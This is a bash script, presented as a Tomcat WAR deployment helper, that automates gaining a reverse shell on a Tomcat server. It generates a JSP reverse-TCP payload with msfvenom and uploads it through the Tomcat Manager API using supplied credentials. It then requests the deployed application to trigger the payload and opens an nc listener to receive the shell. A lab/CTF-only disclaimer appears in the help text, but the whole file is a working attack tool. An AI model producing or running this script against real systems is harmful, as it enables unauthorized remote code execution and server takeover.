#!/usr/bin/env bash
set -euo pipefail

# ==============================================================================
# warsend.sh — Tomcat WAR deployment helper (sanctioned use only)
# ==============================================================================

RED="\033[0;31m"
GREEN="\033[0;32m"
CYAN="\033[0;36m"
YELLOW="\033[1;33m"
RESET="\033[0m"

log()   { echo -e "${GREEN}[+]${RESET} $*"; }
warn()  { echo -e "${YELLOW}[!]${RESET} $*"; }
err()   { echo -e "${RED}[-]${RESET} $*" >&2; }
die()   { err "$*"; exit 1; }

# ------------------------------------------------------------------------------
# Defaults
# ------------------------------------------------------------------------------
PAYLOAD="java/jsp_shell_reverse_tcp"
EXT="war"
MANAGER_PATH="/manager/text"
DRY_RUN=false
CLEANUP=false

# ------------------------------------------------------------------------------
# Help
# ------------------------------------------------------------------------------
usage() {
cat <<EOF
Usage:
  $0 [options]

Required:
  --lhost IP        Listener IP
  --lport PORT      Listener port
  --rhost IP        Target host
  --rport PORT      Target port
  --user USER       Tomcat manager username
  --pass PASS       Tomcat manager password
  --name NAME       WAR application name (no extension)

Optional:
  --payload NAME    msfvenom payload (default: $PAYLOAD)
  --manager PATH    Manager endpoint (default: /manager/text)
  --cleanup         Undeploy WAR after session
  --dry-run         Show actions without executing

Examples:
  Basic deployment:
    $0 --lhost 10.10.14.1 --lport 4444 \\
       --rhost 10.10.10.5 --rport 8080 \\
       --user tomcat --pass tomcat \\
       --name revshell

  Dry run:
    $0 ... --dry-run

Notes:
  * For LAB / CTF / AUTHORIZED testing only
  * Requires Tomcat Manager (text API)
EOF
exit 0
}

# ------------------------------------------------------------------------------
# Argument parsing
# ------------------------------------------------------------------------------
while [[ $# -gt 0 ]]; do
  case "$1" in
    --lhost)   LHOST="$2"; shift 2 ;;
    --lport)   LPORT="$2"; shift 2 ;;
    --rhost)   RHOST="$2"; shift 2 ;;
    --rport)   RPORT="$2"; shift 2 ;;
    --user)    USER="$2"; shift 2 ;;
    --pass)    PASS="$2"; shift 2 ;;
    --name)    FNAME="$2"; shift 2 ;;
    --payload) PAYLOAD="$2"; shift 2 ;;
    --manager) MANAGER_PATH="$2"; shift 2 ;;
    --cleanup) CLEANUP=true; shift ;;
    --dry-run) DRY_RUN=true; shift ;;
    -h|--help) usage ;;
    *) die "Unknown option: $1" ;;
  esac
done

# ------------------------------------------------------------------------------
# Validation
# ------------------------------------------------------------------------------
[[ -z "${LHOST:-}" || -z "${LPORT:-}" || -z "${RHOST:-}" ||
   -z "${RPORT:-}" || -z "${USER:-}" || -z "${PASS:-}" ||
   -z "${FNAME:-}" ]] && usage

for cmd in msfvenom curl nc; do
  command -v "$cmd" &>/dev/null || die "Missing dependency: $cmd"
done

TARGET_URL="http://${RHOST}:${RPORT}${MANAGER_PATH}"
WAR_FILE="${FNAME}.${EXT}"

# ------------------------------------------------------------------------------
# Summary
# ------------------------------------------------------------------------------
log "Target      : ${RHOST}:${RPORT}"
log "Manager API : ${TARGET_URL}"
log "Payload     : ${PAYLOAD}"
log "WAR Name    : ${WAR_FILE}"
log "Cleanup     : ${CLEANUP}"
log "Dry Run     : ${DRY_RUN}"

# ------------------------------------------------------------------------------
# Manager auth check
# ------------------------------------------------------------------------------
log "Testing Tomcat Manager access"
if ! curl -s -u "$USER:$PASS" "${TARGET_URL}" | grep -q "OK"; then
  die "Authentication failed or manager unavailable"
fi

# ------------------------------------------------------------------------------
# Build WAR
# ------------------------------------------------------------------------------
log "Generating WAR payload"
$DRY_RUN || msfvenom -p "$PAYLOAD" LHOST="$LHOST" LPORT="$LPORT" -f "$EXT" > "$WAR_FILE"

# ------------------------------------------------------------------------------
# Deploy
# ------------------------------------------------------------------------------
log "Deploying WAR"
$DRY_RUN || curl -s -u "$USER:$PASS" \
  --upload-file "$WAR_FILE" \
  "${TARGET_URL}/deploy?path=/${FNAME}"

# ------------------------------------------------------------------------------
# Trigger
# ------------------------------------------------------------------------------
log "Triggering application"
$DRY_RUN || curl -s "http://${RHOST}:${RPORT}/${FNAME}/" >/dev/null &

# ------------------------------------------------------------------------------
# Listener
# ------------------------------------------------------------------------------
log "Starting listener on ${LPORT}"
$DRY_RUN || nc -lvnp "$LPORT"

# ------------------------------------------------------------------------------
# Cleanup
# ------------------------------------------------------------------------------
if $CLEANUP; then
  warn "Cleaning up deployment"
  $DRY_RUN || curl -s -u "$USER:$PASS" \
    "${TARGET_URL}/undeploy?path=/${FNAME}"
fi
